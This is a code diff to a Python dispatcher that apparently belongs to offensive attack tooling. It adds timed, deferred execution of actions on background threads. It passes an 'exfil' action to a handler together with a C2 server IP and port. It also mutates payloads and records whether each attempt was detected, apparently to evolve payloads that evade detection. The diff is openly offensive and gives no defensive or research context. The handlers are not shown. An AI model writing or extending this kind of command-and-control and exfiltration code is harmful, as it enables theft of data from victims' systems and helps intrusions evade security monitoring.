@@ -16,6 +16,7 @@ OWN_ROOT = ZDS_ROOT.parent / "OWN" / "OWN_PACKAGE" / "phases"
 sys.path.insert(0, str(ZDS_ROOT))
 sys.path.insert(0, str(OWN_ROOT))
 
+from datetime import datetime, timezone
 from payload_mutator import PayloadMutator, ChannelFeedback
 from entropy_capsule import EntropyCapsuleEngine
 from session_drift_monitor import SessionDriftMonitor
@@ -103,6 +104,28 @@ class Dispatcher:
         action = action_obj.get("action", "unknown")
         print(f"\n[dispatcher] action={action} noise={action_obj.get('noise')} targets={action_obj.get('targets')}")
 
+        # ── Schedule gate ─────────────────────────────────────────────────────
+        schedule = action_obj.get("schedule")
+        if schedule and schedule != "now":
+            try:
+                run_at = datetime.fromisoformat(schedule)
+                if run_at.tzinfo is None:
+                    run_at = run_at.replace(tzinfo=timezone.utc)
+                now = datetime.now(timezone.utc)
+                delay = (run_at - now).total_seconds()
+                if delay > 0:
+                    print(f"[scheduler] deferred — executing at {schedule} (in {int(delay)}s)")
+                    import threading
+                    def deferred():
+                        time.sleep(delay)
+                        print(f"[scheduler] firing deferred action: {action}")
+                        self._execute(action_obj)
+                    t = threading.Thread(target=deferred, daemon=True)
+                    t.start()
+                    return {"scheduled": True, "run_at": schedule, "delay_seconds": int(delay)}
+            except Exception as e:
+                print(f"[scheduler] could not parse schedule '{schedule}': {e} — executing now")
+
         drift_result  = self.drift.ingest(action_obj)
         drift_score   = self.drift.drift_score
         drift_status  = 'HALT' if drift_result['halt'] else 'WARN' if drift_result['warn'] else 'NOMINAL'
@@ -116,6 +139,58 @@ class Dispatcher:
         entropy_result = self.entropy.ingest(action_obj, action_obj.get("_raw_cmd", ""))
         entropy_score  = self.entropy.current_entropy()
         entropy_status = self.entropy.report()['status']
+
+        if entropy_status == "CRITICAL":
+            print(f"[HALT] Entropy blocked — entropy={entropy_score:.3f}")
+            return {"halted": True, "reason": "entropy", "entropy_score": entropy_score}
+
+        mutation = self.mutator.mutate(action_obj=action_obj, entropy_score=entropy_score, drift_score=drift_score)
+        print(f"[mutator] personality={mutation.personality.value} ops={[op.value for op in mutation.mutation_ops]} fitness={mutation.fitness_score:.2f} hash={mutation.payload_hash}")
+
+        handler = _HANDLERS.get(action)
+        if not handler:
+            print(f"[!] No handler for action: {action}")
+            return {"halted": False, "error": f"unknown action: {action}"}
+
+        t0 = time.time()
+        if action == "exfil":
+            result = handler(action_obj, mutation, self.c2_ip, self.c2_port)
+        else:
+            result = handler(action_obj, mutation)
+        result["latency_ms"] = round((time.time() - t0) * 1000, 1)
+
+        self.mutator.feedback(ChannelFeedback(
+            payload_hash = mutation.payload_hash,
+            success      = result.get("success", False),
+            detected     = result.get("detected", False),
+            channel      = result.get("channel", "unknown"),
+            latency_ms   = result.get("latency_ms", 0.0),
+            error        = result.get("error"),
+        ))
+
+        status = "[+]" if result.get("success") else "[!]"
+        print(f"{status} {action} via {result.get('channel')} latency={result.get('latency_ms')}ms")
+        if result.get("error"):
+            print(f"    error: {result['error']}")
+        return result
+
+    def _execute(self, action_obj):
+        """Internal — runs the action immediately, bypassing schedule gate."""
+        action = action_obj.get("action", "unknown")
+
+        drift_result  = self.drift.ingest(action_obj)
+        drift_score   = self.drift.drift_score
+        drift_status  = "HALT" if drift_result["halt"] else "WARN" if drift_result["warn"] else "NOMINAL"
+
+        if drift_status == "HALT":
+            print(f"[HALT] Drift blocked — drift={drift_score:.3f}")
+            return {"halted": True, "reason": "drift", "drift_score": drift_score}
+        if drift_status == "WARN":
+            print(f"[WARN] Drift elevated — drift={drift_score:.3f}")
+
+        entropy_result = self.entropy.ingest(action_obj, action_obj.get("_raw_cmd", ""))
+        entropy_score  = self.entropy.current_entropy()
+        entropy_status = self.entropy.report()["status"]
 
         if entropy_status == "CRITICAL":
             print(f"[HALT] Entropy blocked — entropy={entropy_score:.3f}")
